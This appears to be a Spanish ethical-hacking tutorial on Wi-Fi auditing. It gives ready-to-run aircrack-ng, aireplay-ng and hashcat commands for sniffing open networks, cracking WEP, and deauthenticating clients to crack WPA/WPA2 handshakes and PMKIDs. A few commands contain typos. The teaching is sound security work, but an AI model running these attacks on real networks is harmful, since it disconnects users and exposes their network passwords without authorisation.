- **Master**: También conocido como modo infraestructura, utilizado para utilizar la tarjeta y el sistema a modo de Punto de acceso. En las pruebas de hacking ético necesitaremos configurar la tarjeta en este modo para crear un punto de acceso fraudulento.
- **Managed**: También conocido como modo cliente, es el modo en el que se configura la tarjeta para acceder a cualquier red inalámbrica publicada por un AP. En las pruebas de hacking ético necesitaremos configurar la tarjeta en este modo para acceder a una red inalámbrica.
- **Monitor**: No se emite ningún tipo de frecuencia, únicamente se monitorizan los canales de la banda en la que nos encontremos. En las pruebas de hacking ético necesitaremos configurar la tarjeta en este modo para poder monitorizar los distintos canales de comunicaciones de las redes inalámbricas. Aunque la mayoría de las tarjetas inalámbricas de hoy en día permiten este modo de operación es necesario asegurarse que el procesador de la tarjeta permite este modo y el propio driver del Sistema Operativo permite habilitar este modo de operación en la tarjeta. Si la tarjeta inalámbrica o el propio driver no permiten establecer la tarjeta en modo monitor no se podrán capturar paquetes del espacio radioeléctrico.
- **Adhoc**: Crea una red multipunto sin necesidad de que exista un punto de acceso en la Red. Normalmente no necesitaremos utilizar este modo de operación durante las pruebas de hacking ético.

**Herramientas**
Existen numerosas herramientas que nos ayudan a la hora de realizar las pruebas sobre la red inalámbrica. A continuación enumeramos algunas de las más utilizadas en base a la categoría de la herramienta:

- **Escáner de redes Wi-Fi**: Software que permite capturar toda la información existente en el espacio radioeléctrico WiFi, enumerando redes detectadas, sus características, si son ad hoc o de infraestructura, si hay clientes conectados, cuántos son y qué dirección MAC tiene cada uno, etc.

    - **NetStumbler (Windows)**: Herramienta disponible para Sistemas Operativos Microsoft Windows que permite la monitorización de redes inalámbricas. Uso mediante interfaz gráfica. Sólo soporta monitorización en la banda de los 2,4 GHz. Actualmente se encuentra desactualizado. (Última versión en Mayo de 2011). Página [oficial](http://stumbler.net/)
    - **Kismet / airodump-ng (Linux)**: Herramienta disponible para Sistemas Operativos Linux y OSX que permite la monitorización de redes inalámbricas. Uso mediante consola o interfaz gráfica. Soporta monitorización en la banda de los 2,4 GHz y 5 GHz. Página [oficial](https://www.kismetwireless.net/)

- **Inyección de paquetes**: Software que permite inyectar paquetes en la red, se utiliza para enviar ciertos tipos de tramas, de gestión de red Wi-Fi, con información modificada con la finalidad de alterar la estructura de la red (Modificar la dirección MAC, forzar la desconexión de los clientes, etc). Para poder utilizarlo de manera correcta necesitamos disponer de una tarjeta WiFi con capacidades de inyección.

    - **Aireplay-ng (Linux)**.

- **Cracking de contraseñas**: Software que permite crackear un handshake capturado para capturado para obtener la contraseña de acceso a la red.

    - **Aircrack-ng /** **JhonTheRipper / Hashcat (Linux)**.

- **Punto de Acceso falso**: Software que permite realizar el comportamiento de un punto de acceso por software, se utiliza para generar un punto de acceso falso al que se conecten los clientes.

    - **Hostapd-wpe (Linux)**.

- **Suplantación del portal cautivo**: Software que permite emular un portal cautivo de acceso a la red.

    - [**Wifiphisher (Linux)**](https://github.com/wifiphisher/wifiphisher).

- **Vulnerabilidades del protocolo WPS**: Estas herramientas se aprovechan vulnerabilidades de diseño en el protocolo WPS para averiguar el PIN de acceso de WPS a la red utilizado para intercambiar la contraseña WPA entre el Punto de Acceso y un cliente (Autoconfiguración) si recuperamos el PIN, tendremos acceso de lectura a la configuración de WPA/WPA2.

    - **Reaver (Linux)**.

- **Wardriving**: Movimiento que monitoriza las redes existentes en ubicaciones concretas.

    - [**Wigle**](https://www.wigle.net).

**Suites de análisis**

- **EAP Hammer**: Software todo en uno que permite automatizar un gran número de ataques a redes WiFi.

    - Fake AP.
    - Captive Portal.
    - Downgrade attacks.
    - Capture WPA2 handshake and PMKID.
    - Bruteforce attacks and password spraying.

- **Airgeddon**: Script en bash, herramienta todo en uno que permite automatizar un gran número de ataques a redes WiFi.

    - Fake AP.
    - Captive Portal.
    - Capture WPA2 handshake and PMKID.
    - WEP attacks.

**Terminología de las redes Wi-Fi**
En una red Wi-Fi existe cierta terminología específica que es necesario conocer, a continuación mostraremos los conceptos necesarios que utilizaremos.

- **Dirección MAC:** Dirección de enlace del dispositivo, opera a nivel capa 2 del modelo OSI y es única para cada dispositivo. Identifica de manera inequívoca al dispositivo en la capa de enlace.
- **BSSID:** Es el nombre que recibe el identificador único de un dispositivo que ha creado una red Wireless en modo infraestructura. En realidad, se trata de la “dirección MAC” del Punto de acceso.
- **ESSID:** ó SSID a secas, es un nombre amigable (máximo 32 caracteres alfanuméricos) asignado a una red wifi para que los usuarios la identifiquen con facilidad y para que dos redes no puedan ser confundidas entre sí cuando conviven en el mismo espacio radioeléctrico.
- **Handshake:** Es el procedimiento que se realiza para establecer la comunicación entre el dispositivo Wi-Fi y el Punto de Acceso.
- **Beacon Frames:** Contienen toda la información sobre la red inalámbrica y (salvo que se configure lo contrario) son transmitidos periódicamente para anunciar la presencia de la red Wi-Fi e indicar sus características, contienen la siguiente información: Una cabecera MAC address con la dirección MAC del Punto de Acceso que se anuncia (BSSID). Timestamp u hora con la que las estaciones se sincronizan. Beacon Interval o intervalo entre transmisiones. El nombre de la red Wi-Fi (BSSID). Las capacidades de la red, tales como rangos de velocidades y tipos de seguridad soportados.
- **Probe Request:** Reciben este nombre los intentos de un dispositivo Wi-Fi (cliente) para averiguar si en un determinado momento existe a su alcance una red Wi-Fi a la que haya accedido previamente. Esta característica se utiliza para que un terminal encuentre una red wifi para la que ya conoce la clave.

**Análisis y recolección de datos en redes inalámbricas.**

**Monitorización**
La monitorización de redes inalámbricas consiste en observar el espectro radioléctrico para poder determinar y caracterizar las distintas señales, de redes Wi-Fi, disponibles en nuestro alcance. Para ello es necesario contar con una serie de requisitos técnicos (dispositivos y herramientas) que trataremos en los siguientes subapartados.

Además, constituye una de las primeras fases de las pruebas de hacking ético en entornos Wi-Fi dado que nos permite conocer las redes que hay a nuestro alrededor así como las características de cada una de ellas. A continuación, se enumeran las características de las redes Wi-Fi que nos interesa conocer para, más tarde, realizar las pruebas que apliquen al tipo de red:

- **SSID:** El campo SSID nos indica el nombre de la red. Conocer esta información nos permitiría averiguar cuáles son las redes que nos interesa monitorizar de todas las disponibles en nuestro radio de cobertura. Normalmente los nombres de la red son bastante descriptivos y podríamos averiguar si un determinado nombre de red se corresponde con una red doméstica (por ejemplo si se expone el nombre del ISP o, por el contrario con una red de alguna empresa)
- **BSSID:** El campo BSSID indica la dirección MAC del Punto de Acceso que se encuentra publicando cada red. Recordemos que una misma red Wi-Fi puede prestar servicio a través de varios Puntos de Acceso para ampliar su cobertura. En caso de querer monitorizar un punto de acceso concreto, disponer de su BSSID es esencial para poder capturar paquetes de red Wi-Fi desde o hacia ese Punto de Acceso.
- **Canales en los que opera:** De la misma manera, dado que el uso de canales Wi-Fi consecutivos puede dar lugar a interferencias, en redes que utilizan varios Puntos de Acceso para prestar cobertura es normal que se utilicen de 3. a 5 canales no consecutivos para que la calidad de la señal no se vea afectada. En este caso, conocer los canales sobre los que opera una determinada red nos permite fijar la señal en ese canal en concreto para la captura de paquetes.
- **Tipo de red Wi-Fi y seguridad:** Como hemos visto en apartados anteriores, existen varios tipos de redes Wi-Fi infraestructura (OPEN, WEP, WPA-PSK, WPA/WPA2-Enterprise). El proceso de monitorización nos indica, para cada red disponible, la tipología de red a la que pertenece. Como veremos en los siguientes apartados, esta información nos resultará útil dado que dependiendo del tipo de red utilizada realizaremos una serie de pruebas u otras.
- **Clientes conectados:** Por último, es necesario conocer la cantidad de clientes conectados que hay sobre un determinado Punto de Acceso. Existen ciertas técnicas que se aplicarán, preferiblemente, sobre puntos de acceso donde existan más clientes conectados.

**Estableciendo la tarjeta de red en modo Monitor.**
Dado que aircrack-ng es una de las suites más utilizada para la monitorización de redes Wi-Fi, vamos a detallar el uso de esta suite para monitorizar una red inalámbrica.

Para realizar la monitorización primero se ha de poner la tarjeta en modo monitor y posteriormente utilizar la herramienta de monitorización. En este apartado se indica cómo se realizan ambas operativas.

Antes de proceder con esta operativa es necesario que sepáis que el servicio de gestión de la conexión de red de Linux, Network Manager, suele interferir en la operativa de todas las pruebas que realizaremos sobre las redes Wi-Fi ya que trata de utilizar nuestra tarjeta para utilizarla en modo Managed para tratar de conectarse a las redes inalámbricos como un dispositivo cliente. Para evitar que esto suceda se recomienda parar el servicio NetworkManager hasta que finalicemos las pruebas. se puede utilizar el comando systemctl para parar el servicio NetworkManager de manera temporal

```bash
systemctl stop NetworkManager
```

**Poner la tarjeta en modo monitor.**
Aunque en versiones modernas de la suite de aircrack-ng la propia suite realiza el cambio a modo monitor de manera automática, merece la pena conocer cómo realizar esta operativa de manera manual.

- **Comando iwconfig**: Se puede utilizar el comando iwconfig para poner la tarjeta en modo monitor. En el siguiente ejemplo se muestra el comando para iniciar la interfaz inalámbrica "wlan0" en modo monitor:

```bash
iwconfig wlan0 mode Monitor
```

- **airmon-ng**: En el caso de utilizar airmon-ng te crea una nueva interfaz virtual de tipo "mon". Suponiendo que la interfaz inalámbrica se denomina wlan0:

```bash
airmon-ng start wlan0
```
  
Al completarse la acción se comprueba que se ha creado una nueva interfaz llamada wlan0mon. El comando iwconfig indica las propiedades de la tarjeta inalámbrica.

```bash
iwconfig
```

```bash
wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Tx-Power=-2147483648 dBm
Retry short limit:7 RTS thr:off Fragment thr:off
Power Management:on
```

**Monitorizando la red inalámbrica.**
Utilizaremos la herramienta airodump para monitorizar las redes inalámbricas a nuestro alcance.

airodump-ng es una herramienta en modo consola que permite monitorizar las redes inalámbricas, su funcionamiento básico es muy simple: airodump-ng nombre_interfaz, por ejemplo, el siguiente comando nos muestra las redes inalámbricas al alcance utilizando la interfaz wlan0:

```bash
airodump-ng wlan0
```

Además, airodump- ng tiene muchas características que nos permiten filtrar el tipo de tráfico que queremos capturar. Entre los filtros más importantes que podemos establecer se encuentra La posibilidad de fijar un canal o grupo de canales concretos, filtrar por nombre de la red o filtrar por la dirección mac del punto de acceso.

Todas las opciones de filtrado pueden combinarse entre si.

- **Filtrar por rango de frecuencia**

En ocasiones es muy útil realizar una captura únicamente sobre un rango de frecuencia específico, por ejemplo si queremos monitorizar dispositivos antiguos conectados en la banda de frecuencia de los 2,4 GHz o , si por el contrario, queremos poner el foco en la banda de los 5GHz de frecuencia. Esta operativa se puede realizar de 2 maneras distintas:

- **Indicar la banda de frecuencia a monitorizar**: Admite establecer la banda de frecuencias a monitorizar con el operador --band:

    - Banda a (5 GHz)
    - Bandas bn (2,4 GHZ)

A continuación se muestra un ejemplo de uso

```bash
airodump-ng wlan0 --band a
airodump-ng wlan0 --band bg
```

- **Filtrar los canales de cada banda**: Otra opción es filtrar por los canales específicos de cada banda haciendo uso del operador -c o --channel, si especificamos más de un canal a monitorizar la tarjeta de red va realizando saltos entre los canales que hemos especificados y en cada salto sólo recopila información de ese canal, por lo que dejas de capturar paquetes de los otros canales monitorizados.. Es importante saber que este operador permite indicar rangos de canales:

    - Canal 36-136 (banda 5 GHz)
    - Canal 1-14 (banda 2,4 GHz)

A continuación se muestra un ejemplo de uso:

```bash
airodump-ng wlan0 --channel 7
airodump-ng wlan0 --channel 44
airodump-ng wlan0 --channel 1,3,5-,36,48, 56  
airodump-ng wlan0 --channel 1-11
airodump-ng wlan0 --channel 36-136
airodump-ng wlan0 --channel 1-11,36-136
```

- **Filtrar por nombre de la red**: Es posible filtrar la monitorización a un nombre concreto de red o a una red que contenga un determinado patrón (haciendo uso de sintaxis tipo regex). hay que tener en cuenta que normalmente este tipo de filtrado se puede realizar para filtrar una red en concreto dentro de un canal o para ver todos los canales en los que opera un determinado nombre de red.

Se utiliza el operador --essid para filtrar por un nombre de red en concreto. A continuación se muestran varios ejemplos:

```bash
airodump-ng wlan0 –c 1-14,36-156 -essid Wi-Fi-Hotel
airodump-ng wlan0 –c 44 -essid Invitados
```

Se utiliza el operador --essid-regex para filtrar por un nombre de red que contenga un determinado patrón en el nombre. Los patrones se especifican mediante sintaxis tipo regex. A continuación se muestran varios ejemplos:

```bash
airodump-ng wlan0 –c 1-14,36-156 -essid-regex *Hotel*
airodump-ng wlan0 –c 44 -essid-regex *Invitados*
```

- **Filtrar por dirección MAC del Punto de** **Acceso**: En caso en que existan muchos Puntos de Acceso operando en la misma red y que muchos de estos puntos de acceso operen en el mismo canal, puede ser conveniente filtrar la captura sobre el que más paquetes de datos transmite (Columna #Data del output de airodump-ng). Esta operación se realiza con el operador --bssid. A continuación se muestra un ejemplo de uso:

```bash
airodump-ng wlan0 --channel 36 --bssid AA:BB:CC:DD:EE:FF
```

- **Filtrar por tipo de cifrado**: Por último, también es posible filtrar basándonos en el tipo de cifrado con el operador --encrypt y especificando los sistemas de cifrado:

    - OPN
    - WEP
    - WPA1
    - WPA2

A continuación se muestran varios ejemplos de uso:

```bash
airodump-ng wlan0 --encrypt OPN --band bga
airodump-ng wlan0 --encrypt WEP --band bga
airodump-ng wlan0 --encrypt WPA1 --band bga
airodump-ng wlan0 --encrypt WPA2 --band bga
```

Para acceder a la ayuda de airodump y ver más opciones de configuración de la herramienta se puede utilizar el operador --help.

```bash
airodump-ng --help
```

**Ataques a redes tipo OPEN.**
Como vimos en anteriores subapartados, la principal característica de las redes tipo OPEN es que no establecen ninguna contraseña para que los dispositivos clientes se conecten a la red. De esta manera todos los datos transmitidos por la red que no utilicen protocolos cifrados (HTTP, FTP, telnet) quedarán expuestos.

**Usos**
Normalmente las redes redes de tipo OPEN se utilizan para dotar de conectividad a invitados externos a la organización. Hotspots en restaurantes, bares u hoteles. Dado que se consideran redes poco confiables dado que están abiertas a cualquier individuo, se utilizan únicamente para el acceso a internet.

**Problemas Asociados**

Por sí mismas no establecen ningún tipo de autenticación. No ofrecen ningún tipo de cifrado del canal con lo que los datos se transmiten en claro. Son redes consideradas como poco confiables y que no presentan un mecanismo de validación del punto de acceso. Los clientes suelen tener visibilidad entre ellos pudiendo sufrir ataques de otro equipo de la red. Pueden ser utilizadas para realizar ataques hacia el exterior, quedando registradas como originarias del ataque. Si la red no se encuentra correctamente segmentada y aislada de otras redes, es posible que se produzcan fugas de información e incluso accesos a otras redes.

**Tipos de ataque**

Existen distintos ataques a los que están expuestas las redes tipo OPEN, a continuación se detallan los más comunes.

- **Acceso no autorizado**: Quizá este ataque sea el más sencillo de realizar dado que simplemente hemos de conectarnos a la red. Una vez conectados a la red ya se nos abren otras vías de ataque como puede ser el compromiso de otro equipo conectado a la misma red.

Para conectarnos a una red OPEN podemos realizarlo desde el propio gestor de red de nuestro Sistema Operativo.

También podemos conectarnos a la red desde la consola con el comando iwconfig para acceder a la red y el comando dhclient para obtener una dirección válida de la red.

```bash
iwconfig wlan0 mode Managed essid 'nombre_de_red'
dhclient -v wlan0_
```

- **Ausencia de cifrado**: En este tipo de ataque primero hay que establecer la tarjeta en modo monitor para escuchar en el canal en el que opera la red tipo OPEN y establecer un filtro para que sólo monitorice las tramas que se transmitan al nombre de la red que deseamos (De esta manera no nos llegarán tramas de otras redes que operen en el mismo canal)

```bash
airodump-ng wlan0 --encrypt OPN --band bga -c 100 --essid 'nombre_de_red'
```

Después abrimos wireshark para observar todos los paquetes que se transmiten por la red, veremos tanto las tramas de gestión y los beacons de los dispositivos cliente como el tráfico que se transmita por la red, como es de suponer sólo podremos obtener el tráfico que no se transmita por protocolos cifrados (HTTP, FTP, telnet)

Otra opción consiste en realizar la captura de airodump indicándole que todo el tráfico que recoja lo guarde en un fichero.pcap, mediante el operador -w y más tarde abrir ese fichero pacp con wireshark para buscar datos que se hubieran transmitido en claro. A continuación se muestra cómo se puede guardar la información capturada a un fichero:

```bash
airodump-ng wlan0 --encrypt OPN --band bga -c 100 --essid 'nombre_red' -w nombre-fichero
```

**Ataques a redes tipo WEP.**
El uso de este tipo de redes se considera actualmente obsoleto, si bien es cierto que existen ciertas casuísticas de dispositivos que por su antigüedad siguen trabajando con este tipo de red Wi-Fi.

**Usos**
Dada la antigüedad de este tipo de redes, normalmente es difícil encontrarte con redes de tipo WEP. Sin embargo hoy en día aún siguen siendo utilizadas en los siguientes supuestos: Sistemas SCADA o equipamiento antiguo (Fábricas, sistemas portuarios, etc.), Impresoras antiguas con conectividad WiFi

**Problemas Asociados**
Utiliza el algoritmo RC4, el cual es vulnerable a ataques de tipo estadístico. La longitud de la clave de acceso es entre 5 y 13 caracteres. Los clientes suelen tener visibilidad entre ellos pudiendo sufrir ataques de otro equipo de la red. Si la red no se encuentra correctamente segmentada y aislada de otras redes, es posible que se produzcan fugas de información e incluso accesos a otras redes.

**Tipos de ataque**
Existen distintos ataques a los que están expuestas las redes tipo WEP. Aunque el uso de este tipo de redes es bastante inusual, el ataque más común consiste en capturar tráfico de la red para tratar de obtener la clave de acceso mediante un proceso posterior de cracking.

Dado que la principal debilidad de este protocolo radica en el uso del algoritmo RC4, que presenta vulnerabilidades basadas en ataques estadístico a los vectores de inicialización del algoritmo, de esta manera, a mayor número de vectores de inicialización capturados, mayor probabilidad de éxito del ataque.

Este tipo de ataque se puede realizar con clientes conectados a la red, o sin ningún cliente. A continuación se detallan ambos procesos:

- **Captura de proceso de autenticación y** **averiguación de contraseña (Clientes** **conectados)**: Dado que toda la base del proceso de ataque sobre este tipo de redes se basa en la obtención de vectores de inicialización propagados en las tramas de gestión, el primer paso consiste en monitorizar y capturar todos los datos que se transmitan en la red de tipo WEP y redirigirlos a un fichero.

```bash
airodump-ng –c 11 --bssid AA:BB:CC:DD:EE:FF -w fichero_captura
```
  
Para poder conseguir capturar estos vectores de inicialización de manera más rápida se procede a inyectar ciertas tramas de gestión que fuerzan al Punto de Acceso a generar estos vectores. Como os podéis imaginar, para realizar este proceso necesitaremos que nuestra tarjeta de red disponga de capacidades de inyección de paquetes.

Para empezar se generan tramas de autenticación falsas. Para ello necesitamos conocer los siguientes datos:

- Dirección MAC del Punto de Acceso o BSSID (operador -a)
- Dirección MAC del cliente (operador -h)

Abrimos una nueva ventana del terminal y utilizaremos aireplay con el tipo de ataque "fakeauth" que se corresponde con el tipo de ataque -1, el comando resultante sería similar al siguiente:

```bash
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
```

Una vez se están produciendo los ataques de tipo fake-auth, abrimos otro terminal para realizar un replay de los paquetes ARP que capturemos del cliente, de esta manera se aumenta aún más la generación de los vectores de inicialización. como podéis observar el comando a utilizar es muy similar al anterior, pero en este caso se indica que el ataque es de tipo "arpreplay", que se corresponde con el tipo de ataque -3.

```bash
aireplay-ng -3 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
```

Una vez que se está forzando la generación de estos vectores de inicialización mediante la falsificación de tramas de gestión podemos abrir otro terminal para para utilizar aircrack-ng para que realice el proceso de averiguación de la contraseña en base a los vectores de inicialización capturados

```bash
aircrack-ng fichero_captura.cap
```

- **Captura de proceso de autenticación y averiguación de contraseña (Sin clientes conectados)**: Dado que toda la base del proceso de ataque sobre este tipo de redes se basa en la obtención de vectores de inicialización propagados en las tramas de gestión, el primer paso consiste en monitorizar y capturar todos los datos que se transmitan en la red de tipo WEP y redirigirlos a un fichero.

En este caso el escenario se complica debido a que al no haber clientes conectados no se genera ningún vector de inicialización, pero podemos volver a utilizar la técnica de "fakeauth" para generar una autenticación falsa y proseguir con nuestro ataque.

El primer paso consiste en realizar una monitorización del Punto de Acceso que nos interesa y capturar todo el tráfico en un fichero

```bash
airodump-ng –c 11 --bssid AA:BB:CC:DD:EE:FF -w fichero_captura
```

Para poder conseguir capturar estos vectores de inicialización de manera más rápida se procede a inyectar ciertas tramas de gestión que fuerzan al Punto de Acceso a generar estos vectores. Como os podéis imaginar, para realizar este proceso necesitaremos que nuestra tarjeta de red disponga de capacidades de inyección de paquetes.

Para empezar generamos tramas de autenticación falsas. Para ello necesitamos conocer los siguientes datos:

- Dirección MAC del Punto de Acceso o BSSID (operador -a)
- Dirección MAC del cliente, como no hay ningún cliente, indicaremos la
- dirección MAC de nuestra tarjeta de red (operador -h)

Abrimos una nueva ventana del terminal y utilizaremos aireplay con el tipo de ataque "fakeauth" que se corresponde con el tipo de ataque -1, el comando resultante sería similar al siguiente:

```bash
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
```

Una vez se están produciendo los ataques de tipo fake-auth, necesitamos poder realizar un ataque de tipo arpreplay (como hacíamos en la opción con clientes) el problema en este caso es que al no haber clientes legítimos no podremos capturar un paquete ARP legítimo para modificarlo y hacer el replay. De modo que necesitamos realizar un ataque de tipo "fragmentation attack" indicando el tipo de ataque -5 - en este caso el BSSID se ha de indicar con el parámetro -b.

Abrimos otro terminal para lanzar el ataque de fragmentación indicando el BSSID y la MAC de nuestra tarjeta inalámbrica.

```bash
aireplay-ng -5 0 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
```

El comando anterior nos dará como resultado un fichero de tipo “fragment-xxxx-xxxxxx.xor” que utilizaremos para generar el paquete ARP la generación de este paquete ARP fraudulento se realiza con el comando packetforge-ng y el fichero .xor obtenido del paso anterior e indicaremos que nos guarde el paquete ARP en un fichero llamado "arp-packet".

```bash
packetforge-ng -0 AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 -k 255.255.255.255 -l 255.255.255.255 -y fragment-xxxx-xxxxxx.xor -w arp-packet
```

Una vez que hemos generado el paquete, abriremos otra ventana de terminal y utilizaremos de nuevo aireplay-ng para reenviar el paquete ARP generado mediante el ataque "interactive", mediante el argumento -2, que realiza un envío interactivo de los paquetes ARP generados indicando el fichero ARP con el argumento -r.

```bash
aireplay-ng wlan0 -2 -r arp-packet
```

Una vez que se está forzando la generación de estos vectores de inicialización mediante la falsificación de tramas de gestión podemos abrir otro terminal para para utilizar aircrack-ng para que realice el proceso de averiguación de la contraseña en base a los vectores de inicialización capturados.

```bash
aircrack-ng fichero_captura.cap
```

**Ataques a redes tipo WPA/WPA2-PSK.**
Las redes de tipo WPA/WPA2 surgieron para eliminar las debilidades del estándar WEP. Sin embargo, a lo largo de los años se han ido descubriendo técnicas que permiten llegar a averiguar la contraseña de acceso a las redes de tipo WPA/WPA2-PSK.

**Usos**
Normalmente este tipo de redes se utilizan para dotar de conectividad en redes poco extensas, o en redes de invitados en las que se desea establecer cifrado del canal.

También se utilizan para dotar de conectividad a ciertos dispositivos confiables dentro del segmento (Impresoras, Proyectores, Dispositivos Móviles, Dispositivos VoIP inalámbricos, Hardware específico en IoT…).

En ocasiones también puede encontrarse implementado en pequeños hotspots para dotar de acceso a la red a un determinado grupo de usuarios (VIPS, Administradores,…) o en emplazamientos de difícil conectividad (Salas de Reuniones, Fábricas, Garitas)

**Problemas Asociados**
Todos los usuarios disponen de la misma contraseña de acceso al medio, usuarios temporales conocerían la contraseña, antiguos empleados, etc.

Por si solas no implementan autenticación o distinción por usuarios.

En ocasiones son utilizadas para proveer de conectividad inalámbrica a redes críticas o corporativas.

Aunque el proceso de cracking del algoritmo es muy lento, el establecimiento de una contraseña que no cumpla con una política de generación de contraseñas robusta puede dar lugar a la obtención de la contraseña en claro.

**Tipos de ataque**
Existen distintos ataques a los que están expuestas las redes tipo WPA/WPA2-PSK. El ataque es válido para ambas versiones del protocolo WPA1 y WPA2. El ataque más común consiste en capturar el intento de autenticación de un cliente legítimo de la red (4-way-handsake) para tratar de obtener la clave de acceso a la red mediante un proceso posterior de cracking del 4-way-handshake.

Este tipo de ataque se puede realizar con clientes conectados a la red, o sin ningún cliente. A continuación se detallan ambos procesos:

- **Averiguar contraseña WPA/WPA2-PSK con clientes conectados (cracking 4-way-handshake)**: El proceso para poder averiguar la contraseña de acceso consiste en capturar handshake de autenticación de los clientes legítimos a la red (4-way-handshake). En condiciones normales se pueden capturar este tipo de handshake en menos de 10-15 minutos de monitorización (dependiendo de la actividad de la red). También existe un método para forzar la deautenticación y autenticación de los dispositivos cliente.

El primer paso consiste en fijar nuestra monitorización sobre la red, canal y punto de acceso adecuado para guardar una captura de todo el tráfico monitorizado.

```bash
airodump-ng wlan0 –c 11 --essid 'nombre_red' –bssid AA:BB:CC:DD:EE:FF -w fichero-captura
```

En el caso en el que pase un tiempo prudencial y no se haya capturado ningún intento de autenticación mediante el 4-way-handshake es posible forzar la deautenticación de clientes conectados mediante aireplay-ng y el tipo de ataque "deauth" que se especifica con el tipo de ataque -0

```bash
aireplay-ng -0 0 wlan0 -e 'nombre_red' --ignore-negative-one -a AA:BB:CC:DD:EE:FF
```

También se puede forzar la deautenticación de un único cliente conectado indicando su dirección MAC con el argumento -c. En el momento en el que se captura el 4-way-handshake airodump muestra un mensaje de alerta

```bash
aireplay-ng -0 0 wlan0 -e 'nombre_red' --ignore-negative-one -a AA:BB:CC:DD:EE:FF -c 00:11:22:33:44:55
```

Comprobar que se ha recogido el 4-way-handshake de manera correcta abriendo el fichero de captura con aircrack-ng.

```bash
aircrack-ng fichero-captura
```

Si el handshake se capturó correctamente se puede realizar el proceso de cracking del handshake con aircrack-ng, sólo acepta realizar el proceso de cracking mediante diccionarios de posibles contraseñas.

```bash
aircrack-ng –b AA:BB:CC:DD:EE:FF –w diccionario-contraseñas.txt fichero-captura.cap
```

Dado que existen herramientas más eficientes para realizar el proceso de cracking se puede exportar los datos del 4-way-handshake en otro formato para utilizar otra herramienta de cracking. A continuación se muestra el proceso de exportación y posterior cracking del 4-way-handshake con la herramienta hashcat, tanto mediante una máscara de contraseñas cómo mediante el uso de un diccionario.

```bash
aircrack-ng fichero-captura.cap –j handshake.hccapx
hashcat -m 2500 -a3 handshake.hccapx -1 "_-.$?!" -2 ?l?u?d?1 ?u?l?l?l?l?l?2?2?2?2?2?2 --potfile-path=fichero.pot
hashcat -m 2500 –a0 handshake.hccapx diccionario_passwords.txt –r fichero_reglas_transposicion --potfile-path=fichero.pot
```

- **Averiguar contraseña WPA/WPA2-PSK sin clientes conectados (cracking PMKID)**: El proceso consiste en extraer el RSN IE (Robust Security Network Information Element) de un sólo frame EAPOL. El RSN IE es un campo opcional que contiene el PMKID, el cual se genera por el propio router cuando un usuario intenta autenticarse.

Al igual que en la técnica anterior, es necesario fijar nuestra monitorización sobre la red, canal y punto de acceso adecuado para guardar una captura de todo el tráfico monitorizado.

```bash
airodump-ng wlan0 –c 11 --essid 'nombre_red' –bssid AA:BB:CC:DD:EE:FF -w fichero-captura
```

Una vez se ha capturado el PMKID airodump muestra un mensaje de alerta. En este caso la única opción es realizar el proceso de cracking del PMKID capturado con hashcat para ello es necesario exportar el PMKID con aircrack-ng

```bash
aircrack-ng fichero-captura.cap –j pmkid.hccapx
```

A continuación se muestra El proceso de cracking de PMKID mediante un enfoque de tipo máscara y de diccionario de posibles contraseñas, para realizar este proceso, es necesario disponer de una versión de hashcat 4.20 o superior.

```bash
hashcat -m 16800 -a3 pmkid.hccapx -1 "_-.$?!" -2 ?l?u?d?1 ?u?l?l?l?l?l?2?2?2?2?2?2 --potfile-path=fichero.pot
hashcat -m 16800 –a0 pmkid.hccapx diccionario_passwords.txt –r fichero_reglas_transposicion --potfile-path=fichero.pot
```

**Ataques a redes tipo WPA/WPA2-Enterprise.**
Además de las redes de tipo WPA/WPA2-PSK, en las que todos los usuarios comparten una misma
contraseña de acceso a la red, existe la versión WPA/WPA2-Enterprise.

De manera opuesta a WPA/WPA2-PSK, en este tipo de redes cada usuario tiene unas credenciales de acceso distintas a los demás usuarios de la red, de esta manera, se puede habilitar o denegar el acceso a la red a cada usuario de manera individual. Este proceso de autenticación se apoya en un servidor de tipo RADIUS para verificar la identidad del dispositivo cliente. Esta redes pueden utilizar dos tipos de autenticación distinta para que los usuarios se registren en la red:

- Autenticación basada en credenciales de usuario (usuario/contraseña)
- Autenticación basada en certificados de cliente

Además, la tecnología WPA/WPA2-Enterprise permite identificar los Puntos de Acceso de la red en base a certificados SSL (similar a la comprobación que se realiza cuando se visita una página web mediante HTTPS), sin embargo, para que esta medida sea. efectiva los dispositivos clientes de la red han de disponer como "Entidad Certificadora Confiable" la CA con la que se generaron los certificados de los Puntos de Acceso (En caso contrario no pueden verificar que los certificados del Puntos de Acceso han sido emitidos por una entidad en la que confían).

El problema en este caso radica en la distribución de esa CA a los dispositivos cliente ya que habrá que desplegarlas de manera transparente al usuario. En este sentido se pueden utilizar dos aproximaciones distintas:

- Mediante GPO en dispositivos cliente que pertenezcan a un dominio de Active Directory
- Mediante el uso de sistemas MDM que pueden gestionar de manera remota otros Sistemas Operativos como Linux, macOS, Android e iOS.

**Usos**
Normalmente este tipo de redes se utilizan para dotar de conectividad en redes corporativas en las que se desea establecer cifrado del canal y un control de acceso individual por usuario. Además permiten la trazabilidad de las acciones realizadas.

**Problemas Asociados**
El acceso a este tipo de redes Wi-Fi normalmente proporciona acceso a la red corporativa de manera directa. 

No todos los dispositivos inalámbricos disponen soporte para utilizar este tipo de tecnología Wi-Fi.

La distribución de las CA se ha de realizar mediante otros sistemas adicionales como GPO o MDM.

En caso de no distribuir la CA a los dispositivos clientes de la red, éstos no pueden validar si un Punto de Acceso es legítimo o no, lo que permite la realizar técnicas de "Punto de Acceso falso".

Si la autenticación de los dispositivos cliente se realiza mediante credenciales (usuario/contraseña) y no se valida el certificado del punto de acceso, se pueden realizar técnicas de "Punto de Acceso falso" para capturar los intentos de autenticación y realizar un proceso de cracking para obtener las credenciales con las que se autentica un dispositivo.

**Ataque**
Existe un ataque efectivo en este tipo de redes mediante el cual podemos establecer un "Punto de Acceso falso" en la red para capturar intentos de autenticación basados en credenciales (usuario/contraseña) y realizar un proceso de cracking sobre la autenticación para obtener la contraseña del usuario. Sin embargo, este ataque no es posible en todos los casos, para que este ataque resulte efectivo se han de cumplir las siguientes premisas:

- Este tipo de ataque sólo funciona en el caso de redes WPA2 Enterprise que utilicen autenticación basada en credenciales usuario:contraseña. En caso de utilizar autenticación mediante certificados de cliente este ataque no resulta efectivo.
